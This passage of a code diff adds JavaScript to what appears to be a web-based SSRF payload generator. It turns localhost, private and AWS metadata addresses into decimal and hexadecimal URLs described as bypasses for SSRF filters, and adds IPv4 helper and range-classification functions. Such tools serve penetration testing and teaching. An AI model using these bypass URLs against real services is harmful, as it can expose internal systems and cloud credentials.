+                    const localhostIP = isLocalhostIP ? ip : '127.0.0.1';
+                    const localhostIPNum = isLocalhostIP ? ipNum : 2130706433;
+                    const localhostHex = `0x${(localhostIPNum >>> 0).toString(16)}`;
+                    
+                    bypasses.push(
+                        { name: `Decimal: ${localhostIPNum}`, url: `http://${localhostIPNum}:${port}${path}`, description: `${localhostIP} as decimal number. Common bypass for localhost filters.` },
+                        { name: `Hex: ${localhostHex}`, url: `http://${localhostHex}:${port}${path}`, description: `${localhostIP} as hexadecimal. Common bypass for localhost filters.` }
+                    );
+                }
+
+                // Common private IP examples
+                if (parseInt(parts[0]) === 192 && parseInt(parts[1]) === 168) {
+                    const privateDecimal = ipNum;
+                    bypasses.push(
+                        { name: `Decimal: ${privateDecimal}`, url: `http://${privateDecimal}:${port}${path}`, description: `${ip} as decimal number. Useful for bypassing private IP filters.` },
+                        { name: `Hex: 0x${(ipNum >>> 0).toString(16)}`, url: `http://0x${(ipNum >>> 0).toString(16)}:${port}${path}`, description: `${ip} as hexadecimal. Useful for bypassing private IP filters.` }
+                    );
+                }
+
+                // AWS Metadata Service (169.254.169.254)
+                if (parseInt(parts[0]) === 169 && parseInt(parts[1]) === 254) {
+                    bypasses.push(
+                        { name: 'Decimal: 2852039166', url: `http://2852039166:${port}${path}`, description: '169.254.169.254 (AWS metadata service) as decimal number. Common target for SSRF.' },
+                        { name: 'Hex: 0xa9fea9fe', url: `http://0xa9fea9fe:${port}${path}`, description: '169.254.169.254 as hexadecimal. Common bypass for AWS metadata filters.' }
+                    );
+                }
+            }
+
+            // Render all bypass payloads
+            if (bypasses.length > 0) {
+                renderPayloads('ssrf-bypass-filters-container', bypasses, port);
+            } else {
+                const container = document.getElementById('ssrf-bypass-filters-container');
+                if (container) {
+                    container.innerHTML = '<h3>6 - Bypassing Filters</h3><div class="hint-section"><p style="color: var(--text-secondary);">⚠️ Bypassing Filters techniques are primarily designed for localhost and private IP addresses (127.0.0.0/8, 192.168.0.0/16, etc.). Enter a localhost or private IP address to see bypass techniques.</p></div>';
+                }
+            }
+        }
+
+        // IPv4 validation and helpers
+        function validateIPv4(ip) {
+            if (!ip || typeof ip !== 'string') return false;
+            const parts = ip.split('.');
+            // Accept 1-4 parts (e.g., 127.1, 127.0.1, 127.0.0.1)
+            if (parts.length < 1 || parts.length > 4) return false;
+            return parts.every(part => {
+                const num = parseInt(part);
+                return !isNaN(num) && num >= 0 && num <= 255;
+            });
+        }
+
+        function ipToLong(ip) {
+            const parts = ip.split('.');
+            // Expand to 4 parts if needed
+            while (parts.length < 4) {
+                parts.push('0');
+            }
+            return parts.reduce((acc, octet) => (acc << 8) + parseInt(octet), 0) >>> 0;
+        }
+
+        function longToIp(long) {
+            return [
+                (long >>> 24) & 0xFF,
+                (long >>> 16) & 0xFF,
+                (long >>> 8) & 0xFF,
+                long & 0xFF
+            ].join('.');
+        }
+
+        function toBinaryString(num) {
+            let bin = (num >>> 0).toString(2).padStart(32, '0');
+            return bin.match(/.{8}/g).join('.');
+        }
+
+        function getIPv4Type(ip) {
+            // Detailed checks for IP ranges with explanations
+            const octet1 = (ip >>> 24) & 0xFF;
+            const octet2 = (ip >>> 16) & 0xFF;
+
+            // Private ranges
+            if (octet1 === 10) {
+                return {
+                    name: 'Private (Intranet)',
+                    class: 'private',
+                    description: '10.0.0.0/8 - Class A private network. Used for large internal networks. Not routable on the public Internet.'
+                };
+            }
+            if (octet1 === 172 && octet2 >= 16 && octet2 <= 31) {
+                return {
+                    name: 'Private (Intranet)',
+                    class: 'private',
+                    description: '172.16.0.0/12 - Class B private network. Used for medium-sized internal networks. Not routable on the public Internet.'
+                };
+            }
+            if (octet1 === 192 && octet2 === 168) {
+                return {
+                    name: 'Private (Intranet)',
+                    class: 'private',
+                    description: '192.168.0.0/16 - Class C private network. Commonly used in home and small office networks. Not routable on the public Internet.'
+                };
+            }
+
+            // Loopback
+            if (octet1 === 127) {
+                return {
+                    name: 'Loopback',
+                    class: 'reserved',
+                    description: '127.0.0.0/8 - Loopback addresses. Used for local testing and inter-process communication on the same device. 127.0.0.1 is "localhost".'
+                };
+            }
+
+            // Multicast
+            if (octet1 >= 224 && octet1 <= 239) {
+                return {
+                    name: 'Multicast',
+                    class: 'reserved',
+                    description: '224.0.0.0/4 - Multicast addresses. Used for one-to-many communication, such as streaming video to multiple recipients simultaneously.'
+                };
+            }
+
+            // Reserved/Experimental
+            if (octet1 >= 240) {
+                return {
+                    name: 'Reserved',
+                    class: 'reserved',
+                    description: '240.0.0.0/4 - Reserved for future use or experimental purposes. Not available for general use.'
+                };
+            }
+
+            // Link-local
+            if (octet1 === 169 && octet2 === 254) {
+                return {
+                    name: 'Link-Local',
+                    class: 'reserved',
+                    description: '169.254.0.0/16 - Link-local addresses (APIPA). Auto-assigned when DHCP is unavailable. Only valid on local network segment.'
+                };
+            }
+
+            return {
+                name: 'Public (Internet)',
+                class: 'public',
+                description: 'Globally routable public IP address. Can be used on the public Internet.'
+            };
+        }
+    </script>
+</body>
+
+</html>
